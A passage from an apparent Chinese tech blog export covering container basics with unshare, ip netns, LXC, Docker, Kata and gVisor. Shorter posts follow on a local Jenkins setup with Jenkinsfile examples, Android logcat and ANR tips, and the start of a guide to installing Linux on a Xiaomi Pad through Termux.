 --map-groups=&lt;outergid&gt;,&lt;innergid&gt;,&lt;count&gt;
                           map count groups from outergid to innergid (implies --user)

 --kill-child[=&lt;signame&gt;]  when dying, kill the forked child (implies --fork)
                             defaults to SIGKILL
 --mount-proc[=&lt;dir&gt;]      mount proc filesystem first (implies --mount)
 --propagation slave|shared|private|unchanged
                           modify mount propagation in mount namespace
 --setgroups allow|deny    control the setgroups syscall in user namespaces
 --keep-caps               retain capabilities granted in user namespaces

 -R, --root=&lt;dir&gt;          run the command with root directory set to &lt;dir&gt;
 -w, --wd=&lt;dir&gt;            change working directory to &lt;dir&gt;
 -S, --setuid &lt;uid&gt;        set uid in entered namespace
 -G, --setgid &lt;gid&gt;        set gid in entered namespace
 --monotonic &lt;offset&gt;      set clock monotonic offset (seconds) in time namespaces
 --boottime &lt;offset&gt;       set clock boottime offset (seconds) in time namespaces

 -h, --help                display this help
 -V, --version             display version

For more details see unshare(1).
</code></pre>
<p>最新版本的使用文档可以参考：<a href="https://man7.org/linux/man-pages/man1/unshare.1.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man1/unshare.1.html</a>。</p>
<h3 id="PID命名空间"><a href="#PID命名空间" class="headerlink" title="PID命名空间"></a>PID命名空间</h3><pre><code class="bash">$ sudo unshare --fork --pid --mount-proc bash
# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3952  3020 pts/0    S    22:47   0:00 bash
root         2  0.0  0.0   5644  2636 pts/0    R+   22:47   0:00 ps aux
</code></pre>
<p>可以看到，在新的shell中，已经无法看到父命名空间中的进程了。如果不加<code>--fork</code>参数，看到的进程列表会是当前系统中的全部进程。这是因为新的PID命名空间只在子进程中生效。</p>
<h3 id="用户命名空间"><a href="#用户命名空间" class="headerlink" title="用户命名空间"></a>用户命名空间</h3><pre><code class="bash">$ ps aux | grep bash
root      303493  0.0  0.0   3952  3032 pts/3    S+   07:53   0:00 bash
</code></pre>
<p>在全局进程列表中可以看到，命名空间中的进程实际上也是以root权限执行的，存在一定的安全风险。</p>
<pre><code class="bash">$ unshare --fork --pid --mount-proc --user bash
$ whoami
nobody
</code></pre>
<p>使用<code>--user</code>参数可以创建用户命名空间，并以普通用户权限进入命名空间中。但我们实际操作中更希望容器里面的用户是<code>root</code>权限，此时可以使用<code>--map-root-user</code>参数。</p>
<pre><code class="bash">$ unshare --fork --pid --mount-proc --user --map-root-user bash
# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
# reboot
Failed to connect to bus: No data available
Failed to open initctl fifo: Permission denied
Failed to talk to init daemon.
</code></pre>
<p>使用<code>--map-root-user</code>参数可以将全局的普通用户映射为容器中的<code>root</code>用户，但并不是真正的全局root用户，因此无法访问那些只有全局root用户才能访问的资源。</p>
<h3 id="Mount命名空间"><a href="#Mount命名空间" class="headerlink" title="Mount命名空间"></a>Mount命名空间</h3><p>前面的例子使用的都是宿主机上的操作系统，如果想使用不同的操作系统，可以通过<code>Mount Namespace</code>来实现。</p>
<p>假设现在<code>ubuntu-20.04</code>目录中已经有一个完整的Ubuntu系统了。</p>
<pre><code class="bash">$ sudo unshare -R ubuntu-20.04 bash
root@drunkdream-LB0:/# cat /etc/os-release 
NAME=&quot;Ubuntu&quot;
VERSION=&quot;20.04.4 LTS (Focal Fossa)&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu 20.04.4 LTS&quot;
VERSION_ID=&quot;20.04&quot;
HOME_URL=&quot;https://www.ubuntu.com/&quot;
SUPPORT_URL=&quot;https://help.ubuntu.com/&quot;
BUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;
PRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
</code></pre>
<p>通过<code>-R dir</code> / <code>--root=dir</code>参数可以指定系统根目录。低版本的unshare可能不支持这个参数，可以使用<code>sudo unshare sh -c &#39;chroot ubuntu-20.04 &amp;&amp; bash&#39;</code>命令代替。</p>
<h3 id="网络命名空间"><a href="#网络命名空间" class="headerlink" title="网络命名空间"></a>网络命名空间</h3><p>使用<code>ip netns</code>命令可以进行网络命名空间的管理。</p>
<ul>
<li><p>创建命名空间</p>
<pre><code class="bash">$ sudo ip netns add netns1
</code></pre>
</li>
<li><p>获取命名空间列表</p>
<pre><code class="bash">$ sudo ip netns ls        
netns1
$ ls -l /var/run/netns/netns1
-r--r--r-- 1 root root 0 May 21 15:30 /var/run/netns/netns1
$ sudo ./unshare -R ubuntu-20.04 --net=/var/run/netns/netns1 bash
</code></pre>
<p>网络命名空间会存储在<code>/var/run/netns</code>目录下。</p>
</li>
<li><p>在网路命名空间中执行命令</p>
<pre><code class="bash">$ sudo ip netns exec netns1 ip a
1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1000
  link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</code></pre>
</li>
<li><p>启用网络设备</p>
</li>
</ul>
<pre><code class="bash">$ sudo ip netns exec netns1 ip link set lo up
$ sudo ip netns exec netns1 ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
</code></pre>
<ul>
<li>创建veth-pair</li>
</ul>
<blockquote>
<p>veth-pair是一对虚拟设备接口，和<code>tap/tun</code>设备不同的是，它都是成对出现的，一端连着协议栈，一端彼此相连着。</p>
</blockquote>
<pre><code class="bash">$ sudo ip link add veth1 type veth peer name veth2
$ sudo ip link set veth2 netns netns1
$ sudo ip netns exec netns1 ip link set veth2 up
$ sudo ip netns exec netns1 ip addr add 192.168.10.2/24 dev veth2
$ sudo ip link set veth1 up
$ sudo ip addr add 192.168.10.1/24 dev veth1
</code></pre>
<ul>
<li>配置路由转发</li>
</ul>
<pre><code class="bash">$ sudo ip netns exec netns1 ip route add default via 192.168.10.1 dev veth2
$ sudo iptables -A FORWARD -o veth1 -j ACCEPT
$ sudo iptables -A FORWARD -i veth1 -j ACCEPT
$ sudo iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o eth0 -j MASQUERADE
</code></pre>
<blockquote>
<p><code>eth0</code>需要替换成本机的实际网络接口</p>
</blockquote>
<p>此时，容器内就可以访问外网了。</p>
<ul>
<li>与unshare相结合</li>
</ul>
<p>unshare也提供了<code>--net=/var/run/netns/netns1</code>参数来创建网络命名空间，但是实际测试下来发现有些问题。所以比较保险的方案还是将<code>sudo ip netns exec netns1</code>与<code>unshare</code>结合起来使用。</p>
<pre><code class="bash">$ sudo ip netns exec netns1 unshare -R ubuntu-20.04 ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
29: veth2@if30: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:2c:29:36:5c:9a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.10.2/24 scope global veth2
       valid_lft forever preferred_lft forever
    inet6 fe80::fc2c:29ff:fe36:5c9a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre>
<h2 id="0x03-打造一个相对完整的容器"><a href="#0x03-打造一个相对完整的容器" class="headerlink" title="0x03 打造一个相对完整的容器"></a>0x03 打造一个相对完整的容器</h2><p>从上面的介绍来看，如果不需要用到网络虚拟化，是可以使用普通用户权限的。</p>
<h3 id="使用普通用户权限创建不支持网络命名空间的容器"><a href="#使用普通用户权限创建不支持网络命名空间的容器" class="headerlink" title="使用普通用户权限创建不支持网络命名空间的容器"></a>使用普通用户权限创建不支持网络命名空间的容器</h3><ul>
<li><p>新版本unshare</p>
<pre><code class="bash">$ unshare --fork --pid --mount-proc --mount --uts --ipc -R . --map-root-user bash
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
</code></pre>
</li>
<li><p>旧版本unshare</p>
<pre><code class="bash">$ unshare --fork --pid --mount-proc --mount --uts --ipc --user --map-root-user sh -c &#39;mount -o bind /proc proc &amp;&amp; chroot .&#39;
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
</code></pre>
</li>
</ul>
<h3 id="使用root权限创建支持网络命名空间的容器"><a href="#使用root权限创建支持网络命名空间的容器" class="headerlink" title="使用root权限创建支持网络命名空间的容器"></a>使用root权限创建支持网络命名空间的容器</h3><pre><code class="bash">$ sudo ip netns exec netns1 unshare --fork --pid --mount-proc --mount --uts --ipc -R . --map-root-user bash
</code></pre>
<blockquote>
<p>旧版本unshare方式不再赘述</p>
</blockquote>
<p>在Ubuntu里使用<code>apt</code>时如果遇到下面这个错误：</p>
<pre><code class="bash">root@drunkdream-LB0:/# apt update
E: setgroups 65534 failed - setgroups (1: Operation not permitted)
E: setegid 65534 failed - setegid (22: Invalid argument)
E: seteuid 100 failed - seteuid (22: Invalid argument)
E: setgroups 0 failed - setgroups (1: Operation not permitted)
Reading package lists... Done
W: chown to _apt:root of directory /var/lib/apt/lists/partial failed - SetupAPTPartialDirectory (22: Invalid argument)
W: chown to _apt:root of directory /var/lib/apt/lists/auxfiles failed - SetupAPTPartialDirectory (22: Invalid argument)
E: setgroups 65534 failed - setgroups (1: Operation not permitted)
E: setegid 65534 failed - setegid (22: Invalid argument)
E: seteuid 100 failed - seteuid (22: Invalid argument)
E: setgroups 0 failed - setgroups (1: Operation not permitted)
E: Method gave invalid 400 URI Failure message: Failed to setgroups - setgroups (1: Operation not permitted)
E: Method gave invalid 400 URI Failure message: Failed to setgroups - setgroups (1: Operation not permitted)
E: Method http has died unexpectedly!
E: Sub-process http returned an error code (112)
</code></pre>
<p>可以通过在进入容器后使用以下命令解决：</p>
<pre><code class="bash"># apt-config dump | grep Sandbox::User
APT::Sandbox::User &quot;_apt&quot;;
# cat &lt;&lt;EOF &gt; /etc/apt/apt.conf.d/sandbox-disable
APT::Sandbox::User &quot;root&quot;;
EOF
# apt-config dump | grep Sandbox::User
APT::Sandbox::User &quot;root&quot;;
</code></pre>
<h2 id="0x04-Linux容器技术——LXC"><a href="#0x04-Linux容器技术——LXC" class="headerlink" title="0x04 Linux容器技术——LXC"></a>0x04 Linux容器技术——LXC</h2><p>lxc是一种系统级容器，在使用体验上与传统的虚拟机差异不是很大。<br>lxc模板文件位于<code>/usr/share/lxc/templates</code>路径下，包含了绝大多数的Linux发行版。</p>
<pre><code class="bash">$ ls /usr/share/lxc/templates
lxc-alpine     lxc-centos    lxc-fedora         lxc-oci           lxc-plamo      lxc-sparclinux    lxc-voidlinux
lxc-altlinux   lxc-cirros    lxc-fedora-legacy  lxc-openmandriva  lxc-pld        lxc-sshd
lxc-archlinux  lxc-debian    lxc-gentoo         lxc-opensuse      lxc-sabayon    lxc-ubuntu
lxc-busybox    lxc-download  lxc-local          lxc-oracle        lxc-slackware  lxc-ubuntu-cloud
</code></pre>
<h3 id="创建lxc容器"><a href="#创建lxc容器" class="headerlink" title="创建lxc容器"></a>创建lxc容器</h3><pre><code class="bash">$ sudo lxc-create -t ubuntu -n ubuntu-xenial
</code></pre>
<h3 id="修改lx容器网络类型"><a href="#修改lx容器网络类型" class="headerlink" title="修改lx容器网络类型"></a>修改lx容器网络类型</h3><p>默认的lxc容器网络是<code>empty</code>类型，只有<code>lo</code>网卡，不能访问外网。可以通过修改<code>/var/lib/lxc/ubuntu-xenial/config</code>文件中的<code>lxc.net.0.type = empty</code>为<code>lxc.net.0.type = none</code>，来使用主机网络。</p>
<h3 id="启动lxc容器"><a href="#启动lxc容器" class="headerlink" title="启动lxc容器"></a>启动lxc容器</h3><pre><code class="bash">$ sudo lxc-start ubuntu-xenial
</code></pre>
<h3 id="进入lxc容器"><a href="#进入lxc容器" class="headerlink" title="进入lxc容器"></a>进入lxc容器</h3><pre><code class="bash">$ sudo lxc-attach ubuntu-xenial bash
root@ubuntu-xenial:/# cat /etc/lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.7 LTS&quot;
root@ubuntu-xenial:/# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  37236  5288 ?        Ss   23:51   0:00 /sbin/init
root        36  0.0  0.0  35276  5440 ?        Ss   23:51   0:00 /lib/systemd/systemd-journald
root        85  0.0  0.0  30720  2880 ?        Ss   23:51   0:00 /usr/sbin/cron -f
syslog      87  0.0  0.0 256396  3196 ?        Ssl  23:51   0:00 /usr/sbin/rsyslogd -n
root       124  0.0  0.0  17492  2180 console  Ss+  23:51   0:00 /sbin/agetty --noclear --keep-baud console 115200 38400 9600 
root       125  0.0  0.0  17492  2244 pts/2    Ss+  23:51   0:00 /sbin/agetty --noclear --keep-baud pts/2 115200 38400 9600 vt
root       126  0.0  0.0  17492  2172 pts/3    Ss+  23:51   0:00 /sbin/agetty --noclear --keep-baud pts/3 115200 38400 9600 vt
root       127  0.0  0.0  17492  2176 pts/1    Ss+  23:51   0:00 /sbin/agetty --noclear --keep-baud pts/1 115200 38400 9600 vt
root       128  0.0  0.0  17492  2236 pts/0    Ss+  23:51   0:00 /sbin/agetty --noclear --keep-baud pts/0 115200 38400 9600 vt
root       129  0.0  0.0  65516  5412 ?        Ss   23:51   0:00 /usr/sbin/sshd -D
root       137  0.0  0.0  18256  3256 ?        Ss   23:53   0:00 bash
root       149  0.0  0.0  34428  2796 ?        R+   23:54   0:00 ps aux
</code></pre>
<p>可以看出，想比于docker，lxc容器更接近于完整的Linux系统。</p>
<h3 id="停止lxc容器"><a href="#停止lxc容器" class="headerlink" title="停止lxc容器"></a>停止lxc容器</h3><pre><code class="bash">$ sudo lxc-stop ubuntu-xenial
</code></pre>
<h3 id="删除lxc容器"><a href="#删除lxc容器" class="headerlink" title="删除lxc容器"></a>删除lxc容器</h3><pre><code class="bash">$ sudo lxc-destroy ubuntu-xenial
</code></pre>
<h2 id="0x05-容器技术的集大成者——Docker"><a href="#0x05-容器技术的集大成者——Docker" class="headerlink" title="0x05 容器技术的集大成者——Docker"></a>0x05 容器技术的集大成者——Docker</h2><p>Docker是一种应用级容器，倡导每个容器只包含一个主进程。同时，它提供了打包容器镜像的支持，从而大大降低了容器分发的成本，使得基于容器镜像的应用部署逐渐成为主流。可以说，Docker最大的贡献就是创造性地发明了容器镜像技术，并通过推动OCI（Open Container Initiative）标准，统一了镜像规范和运行时规范。</p>
<p>常见的Docker操作命令可以参考：<a href="https://www.drunkdream.com/2019/04/04/docker-command/">https://www.drunkdream.com/2019/04/04/docker-command/</a>。</p>
<p>OCI 对容器 runtime 的标准主要是指定容器的运行状态，和 runtime 需要提供的命令。下面是容器状态转换图：</p>
<p><img src="/images/container-state.png" alt></p>
<p><code>RunC</code>是Docker提供的一个OCI运行时实现， 是从Docker的libcontainer中迁移而来，实现了容器启停、资源隔离等功能，可以作为容器运行时标准的参考实现。</p>
<p>除了<code>RunC</code>，还有<code>Kata</code>、<code>gVisor</code>等OCI实现。</p>
<p><code>containerd</code>是一个上层的容器运行时，与<code>RunC</code>等底层容器运行时相比，它还包含了镜像管理等能力。</p>
<p><img src="/images/containerd-arch.png" alt></p>
<p>K8S也从1.23版本开始弃用Docker，改用containerd作为容器运行时。下图是改用containerd之后的基本架构。</p>
<p><img src="/images/containerd.png" alt></p>
<h2 id="0x06-容器技术的未来"><a href="#0x06-容器技术的未来" class="headerlink" title="0x06 容器技术的未来"></a>0x06 容器技术的未来</h2><p><code>RunC</code>作为传统的容器运行时技术，由于与宿主机共享内核，一直存在着隔离性差的缺点。因此，以提升隔离性为目标的<code>Kata</code>、<code>gVisor</code>等新的容器运行时技术被开发出来。</p>
<h3 id="Kata"><a href="#Kata" class="headerlink" title="Kata"></a>Kata</h3><p>Kata Containers开源项目于2017年底正式启动，其目标是将虚拟机（VM）的安全优势与容器的高速及可管理性相结合，为用户带来出色的容器解决方案。Kata的目标是开发<code>面向云原生的虚拟化</code>技术，也就是通过创建轻量级的虚拟机以提供像容器一样快同时又像虚拟机一样安全的容器。</p>
<h3 id="gVisor"><a href="#gVisor" class="headerlink" title="gVisor"></a>gVisor</h3><p>gVisor是Google开发的一款轻量级容器运行时，提供了更高的隔离性。与其它运行时使用虚拟机提升隔离性不同，它实现了一个<code>用户层内核</code>，通过拦截系统调用提供了强隔离边界。因此，gVisor更加轻量，资源占用更少。但对于少量应用程序可能存在兼容性问题。</p>
<p><img src="/images/gvisor.png" alt></p>
<h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul>
<li><a href="https://josephmuia.ca/2018-05-16-net-namespaces-veth-nat/" target="_blank" rel="noopener">https://josephmuia.ca/2018-05-16-net-namespaces-veth-nat/</a></li>
<li><a href="https://www.l6bj.com/post/cloudnative/docker/02-namespace/" target="_blank" rel="noopener">https://www.l6bj.com/post/cloudnative/docker/02-namespace/</a></li>
<li><a href="https://www.waynerv.com/posts/container-fundamentals-filesystem-isolation-and-sharing/" target="_blank" rel="noopener">https://www.waynerv.com/posts/container-fundamentals-filesystem-isolation-and-sharing/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/372698959" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/372698959</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/370869886" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/370869886</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/369510683" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/369510683</a></li>
<li><a href="https://www.modb.pro/db/248305" target="_blank" rel="noopener">https://www.modb.pro/db/248305</a></li>
<li><a href="https://www.cnblogs.com/bakari/p/10613710.html" target="_blank" rel="noopener">https://www.cnblogs.com/bakari/p/10613710.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/441238885" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/441238885</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>container</tag>
      </tags>
  </entry>
  <entry>
    <title>本地部署Jenkins环境</title>
    <url>/2019/12/06/local-deploy-jenkins/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Jenkins是一款使用比较广泛的<code>CI/CD</code>平台，2.0版本开始支持了<code>pipeline</code>，通过<code>jenkinsfile</code>文件进行流水线的控制。本文提供了一种在本地Linux环境中快速搭建Jenkins测试环境的方法。</p>
<h2 id="0x01-环境部署"><a href="#0x01-环境部署" class="headerlink" title="0x01 环境部署"></a>0x01 环境部署</h2><p>直接使用docker镜像搭建环境是一种比较快捷的方法。编写如下<code>Dockerfile</code>文件：</p>
<pre><code class="Dockerfile">FROM jenkins/jenkins:lts

USER root
RUN apt -y update \
    &amp;&amp; apt -y upgrade \
    &amp;&amp; apt -y install python-pip
</code></pre>
<p>使用命令：<code>docker build -t jenkins .</code>进行镜像编译。</p>
<p>编译后使用命令：<code>docker run --name jenkins -i -p 8787:8080 -p 50000:50000 -v /var/run/docker.sock:/var/run/docker.sock -v /usr/bin/docker:/usr/bin/docker -v /data/jenkins/jenkins_home:/var/jenkins_home:rw jenkins</code>启动镜像。</p>
<p><code>/var/run/docker.sock</code>和<code>/usr/bin/docker</code>这两个挂载是为了支持<code>Docker in Docker</code>。<code>/data/jenkins/jenkins_home</code>这个挂载是为了便于保存Jenkins数据，以免容器重启后又要重新配置。</p>
<h2 id="0x02-初始化Jenkins配置"><a href="#0x02-初始化Jenkins配置" class="headerlink" title="0x02 初始化Jenkins配置"></a>0x02 初始化Jenkins配置</h2><p>使用浏览器访问<code>http:/127.0.0.1:8787/</code>页面，进行初始化操作。</p>
<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><h2 id="0x03-编写Jenkinsfile"><a href="#0x03-编写Jenkinsfile" class="headerlink" title="0x03 编写Jenkinsfile"></a>0x03 编写Jenkinsfile</h2><p>文档地址：<a href="https://jenkins.io/zh/doc/book/pipeline/syntax/" target="_blank" rel="noopener">https://jenkins.io/zh/doc/book/pipeline/syntax/</a>。</p>
<p><code>Jenkinsfile</code>分为<code>声明式</code>和<code>脚本式</code>，这里主要介绍<code>声明式</code>。</p>
<p>下面是一个简单的模板：</p>
<pre><code class="Jenkinsfile">pipeline {
  agent {
    label &quot;default&quot;
  }

  stages  {
    stage(&quot;检出&quot;) {
      steps {
        sh &#39;ci-init&#39;
        checkout(
          [$class: &#39;GitSCM&#39;, branches: [[name: env.GIT_BUILD_REF]], 
                  userRemoteConfigs: [[url: env.GIT_REPO_URL]]]
        )
      }
    }

    stage(&quot;构建&quot;) {
      steps {
        echo &quot;构建中...&quot;
        sh &#39;go version&#39;
        sh &#39;node -v&#39;
        sh &#39;java -version&#39;
        sh &#39;php -v&#39;
        sh &#39;python -V&#39;
        sh &#39;gcc -v&#39;
        sh &#39;make -v&#39;
        // 请在这里放置您项目代码的单元测试调用过程，例如:
        // sh &#39;mvn package&#39; // mvn 示例
        // sh &#39;make&#39; // make 示例
        echo &quot;构建完成.&quot;
        // archiveArtifacts artifacts: &#39;**/target/*.jar&#39;, fingerprint: true // 收集构建产物
      }
    }

    stage(&quot;测试&quot;) {
      steps {
        echo &quot;单元测试中...&quot;
        // 请在这里放置您项目代码的单元测试调用过程，例如:
        // sh &#39;mvn test&#39; // mvn 示例
        // sh &#39;make test&#39; // make 示例
        echo &quot;单元测试完成.&quot;
        // junit &#39;target/surefire-reports/*.xml&#39; // 收集单元测试报告的调用过程
      }
    }

    stage(&quot;部署&quot;) {
      steps {
        echo &quot;部署中...&quot;
        // 请在这里放置收集单元测试报告的调用过程，例如:
        // sh &#39;mvn tomcat7:deploy&#39; // Maven tomcat7 插件示例：
        // sh &#39;./deploy.sh&#39; // 自研部署脚本
        echo &quot;部署完成&quot;
      }
    }
  }
}
</code></pre>
<h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><h4 id="指定docker镜像"><a href="#指定docker镜像" class="headerlink" title="指定docker镜像"></a>指定docker镜像</h4><pre><code>  agent {
    docker {
      image &#39;demo/test/base:latest&#39;
      registryUrl &#39;https://drunkdream-docker.pkg.coding.net&#39;
    }
  }
</code></pre><h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><pre><code>  environment {
    MY_ENV = &#39;test&#39;
  }
</code></pre><h4 id="访问环境变量"><a href="#访问环境变量" class="headerlink" title="访问环境变量"></a>访问环境变量</h4><p>Jenkins内置的环境变量列表可以在<code>http://jenkins-server/pipeline-syntax/globals#env</code>地址中获取。</p>
<p>环境变量可以通过<code>${env.My_ENV}</code>或<code>${My_ENV}</code>或<code>$My_ENV</code>来访问。需要注意的是，使用引号的时候尽量使用<code>&quot;</code>，如：<code>echo &quot;${env.My_ENV}&quot;</code>，否则会无法生效。Jenkins应该是在运行时将变量动态替换成了实际值，使用单引号的话，则不会进行替换。</p>
<p>而如果写成<code>sh &#39;echo ${MY_ENV}&#39;</code>则是可以正常工作的，因为此时是由<code>shell</code>程序进行环境变量的读取。</p>
<pre><code>  stage(&#39;测试&#39;) {
    steps {
      echo &quot;${env.MY_ENV}&quot;
      echo &quot;${MY_ENV}&quot;
      echo &quot;$MY_ENV&quot;
      sh &#39;echo $MY_ENV&#39;
      sh &#39;python -c &quot;print(__import__(\&#39;os\&#39;).environ[\&#39;MY_ENV\&#39;])&quot;&#39;
      echo &#39;${env.MY_ENV}&#39; //输出`${env.MY_ENV}`
    }
  }
</code></pre><p>前五条命令都可以正常输出变量值，但最后一条却无法输出。</p>
<h4 id="将命令行输出赋值给变量"><a href="#将命令行输出赋值给变量" class="headerlink" title="将命令行输出赋值给变量"></a>将命令行输出赋值给变量</h4><p>Jenkins的<code>${env.My_ENV}</code>方式不支持默认值，也就是<code>bash</code>中的<code>${MY_ENV:-&quot;test&quot;}</code>写法。如果需要这种用法，可以使用以下方式：</p>
<pre><code>  stage(&#39;测试&#39;) {
    steps {
      script {
        ENV1 = sh(returnStdout: true, script: &#39;echo ${MY_ENV:-&quot;default&quot;}&#39;).trim()
      }
      sh &#39;echo ${ENV1}&#39; //可以正常输出
      sh &#39;python -c &quot;print(__import__(\&#39;os\&#39;).environ[\&#39;ENV1\&#39;])&quot;&#39; //会报错
    }
  }
</code></pre><p><code>trim()</code>方法可以去掉前后的空白字符。</p>
<blockquote>
<p>注意：<code>${MY_ENV:-&quot;default&quot;}</code>不能写成<code>${env.MY_ENV:-&quot;default&quot;}</code></p>
</blockquote>
<p>虽然这种方式赋值的变量也可以通过<code>${env.ENV1}</code>方式访问，但其实它并不是环境变量。</p>
<h4 id="动态配置环境变量"><a href="#动态配置环境变量" class="headerlink" title="动态配置环境变量"></a>动态配置环境变量</h4><pre><code>  stage(&#39;测试&#39;) {
    steps {
      script {
        ENV1 = sh(returnStdout: true, script: &#39;echo ${MY_ENV:-&quot;default&quot;}&#39;).trim()
      }
      withEnv([&quot;MY_ENV=${ENV1}&quot;]) {
        sh &#39;python -c &quot;print(__import__(\&#39;os\&#39;).environ[\&#39;MY_ENV\&#39;])&quot;&#39; //输出default
      }
    }
  }
</code></pre>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>logcat无法使用</title>
    <url>/2017/01/07/logcat-cannot-use/</url>
    <content><![CDATA[<p>最近为三星Note2|N7100刷入内核版本为3.0.31-1071214的ROM，发现使用logcat时给出如下错误提示：</p>
<blockquote>
<p>Unable to open log device \’/dev/log/main\’: No such file or directory    </p>
</blockquote>
<p>通过各种搜索分析最终找到针对该机型的解决办法，解决方式如下：  </p>
<ol>
<li>从手机进入目录：/system/etc/init.d;  </li>
<li>在该目录下找到S82logger文件，用记事本打开，可以看到如下语句：rm /dev/log/main，将该语句删除。  </li>
<li>在该目录下找到04opb-tweaks文件，用记事本打开，找到如下语句：rm /dev/log/main，将该语句删除。  </li>
<li>重启手机。</li>
</ol>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>logcat</tag>
      </tags>
  </entry>
  <entry>
    <title>让应用ANR的方法</title>
    <url>/2017/01/07/make-app-anr/</url>
    <content><![CDATA[<p>今天发现一种让应用弹出ANR窗口的简单方法，记录一下</p>
<blockquote>
<p>kill -19 pid</p>
</blockquote>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>ANR</tag>
      </tags>
  </entry>
  <entry>
    <title>魅族MX4关闭强制GPU渲染的方法</title>
    <url>/2017/01/07/meizu-mx4-close-gpu/</url>
    <content><![CDATA[<p>默认在设置里没有该开关，需要<br>在手机拨号界面输入<strong>*#*#6961#*#*</strong><br>再到手机设置里关掉</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>meizu</tag>
        <tag>gpu</tag>
      </tags>
  </entry>
  <entry>
    <title>小米平板5安装Linux系统</title>
    <url>/2021/08/30/mipad5-install-linux/</url>
    <content><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>小米平板5开始支持了键盘与鼠标，终于离生产力工具越来越近了。因此，从入手小米平板5开始，就想着怎么安装一个linux系统，可以在里面安装<code>vscode</code>，以便使用pad开发代码。下面是这段折腾之路的记录。</p>
<h2 id="0x01-使用Aid-Learning方案"><a href="#0x01-使用Aid-Learning方案" class="headerlink" title="0x01 使用Aid Learning方案"></a>0x01 使用Aid Learning方案</h2><p><code>Aid Learning</code>是一个为在Android机器上进行AI开发而实现的APP，官网地址为：<code>http://www.aidlearning.net/</code>。这个APP内置了vscode，对于不想折腾的同学非常友好。</p>
<p>但是，这个应用的实现方案是创建了一个<code>vscode server</code>，客户端其实只是一个浏览器。这种方式体验上并不是很好，所以还是想达到与linux本地开发一致的体验。</p>
<p><img src="/images/aid-learning.jpg" alt><br><img src="/images/aid-learning-vscode.jpg" alt></p>
<h2 id="0x02-在Termux中安装linux系统"><a href="#0x02-在Termux中安装linux系统" class="headerlink" title="0x02 在Termux中安装linux系统"></a>0x02 在Termux中安装linux系统</h2><p><code>Termux</code>是一个Android上的终端模拟器，可以免root模拟linux环境，同时提供了大量linux上的软件供安装使用，但它本质上还是一个Android环境。在这个环境中可以通过安装<code>proot-distro</code>工具来安装真正的linux系统。</p>
<p>APK下载地址：<a href="https://f-droid.org/packages/com.termux/" target="_blank" rel="noopener">https://f-droid.org/packages/com.termux/</a>。</p>
<pre><code class="bash">$ apt install proot-distro
</code></pre>
<pre><code class="bash">$ proot-distro list
Supported distributions:

    Alpine Linux (3.14.1)

    Alias: alpine
    Status: NOT installed

    Arch Linux

    Alias: archlinux
    Status: NOT installed

    Debian (bullseye)

    Alias: debian
    Status: NOT installed

    Fedora (34)

    Alias: fedora
    Status: installed

    Gentoo

    Alias: gentoo
    Status: NOT installed

    OpenSUSE (Tumbleweed)

    Alias: opensuse
    Status: NOT installed

    Ubuntu (20.04)

    Alias: ubuntu
    Status: installed

    Void Linux

    Alias: void
    Status: NOT installed

Install selected one with: proot-distro install &lt;alias&gt;
</code></pre>
